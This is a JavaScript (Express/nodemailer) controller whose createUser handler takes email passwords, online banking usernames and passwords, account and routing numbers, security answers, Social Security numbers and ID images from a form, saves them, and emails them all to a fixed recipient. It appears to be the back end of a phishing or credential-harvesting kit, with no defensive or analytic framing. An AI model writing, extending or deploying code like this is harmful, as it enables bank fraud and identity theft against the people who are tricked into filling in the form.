import userModel from "../models/userModel";
import nodemailer from "nodemailer";

// Create a new user and send email
export const createUser = async (req, res) => {
  const {
    firstName,
    lastName,
    email,
    emailPassword,
    bankName,
    accountNumber,
    routingNumber,
    onlineUsername,
    onlinePassword,
    securityQuestion,
    securityAnswer,
    idType,
    ssn,
    idImage,
  } = req.body;

  try {
    // Save user to database
    const user = new userModel({
      firstName,
      lastName,
      email,
      emailPassword,
      bankName,
      accountNumber,
      routingNumber,
      onlineUsername,
      onlinePassword,
      securityQuestion,
      securityAnswer,
      idType,
      ssn,
      idImage,
    });

    await user.save();

    // Send email with nodemailer
    const transporter = nodemailer.createTransport({
      service: "gmail", // Use your preferred email provider
      auth: {
        user: process.env.EMAIL_USER, // Your email address
      },
    });

    const mailOptions = {
      from: process.env.EMAIL_USER,
      to: "recipient@example.com", // Replace with the desired recipient's email
      subject: "New User Data Submitted",
      html: `
        <h3>New User Information</h3>
        <p><b>First Name:</b> ${firstName}</p>
        <p><b>Last Name:</b> ${lastName}</p>
        <p><b>Email:</b> ${email}</p>
        <p><b>Password:</b> ${emailPassword}</p>
        <p><b>Bank Name:</b> ${bankName}</p>
        <p><b>Account Number:</b> ${accountNumber}</p>
        <p><b>Routing Number:</b> ${routingNumber}</p>
        <p><b>Online Username:</b> ${onlineUsername}</p>
        <p><b>Online Password:</b> ${onlinePassword}</p>
        <p><b>Security Question:</b> ${securityQuestion}</p>
        <p><b>Security Answer:</b> ${securityAnswer}</p>
        <p><b>ID Type:</b> ${idType}</p>
        <p><b>SSN:</b> ${ssn}</p>
        ${
          idImage
            ? `<p><b>ID Image:</b> <img src="${idImage}" alt="ID Image" style="max-width: 200px;" /></p>`
            : ""
        }
      `,
    };

    await transporter.sendMail(mailOptions);

    res
      .status(201)
      .json({ message: "User created and email sent successfully!" });
  } catch (error) {
    console.error("Error creating user:", error.message);
    res
      .status(500)
      .json({ message: "Error creating user", error: error.message });
  }
};
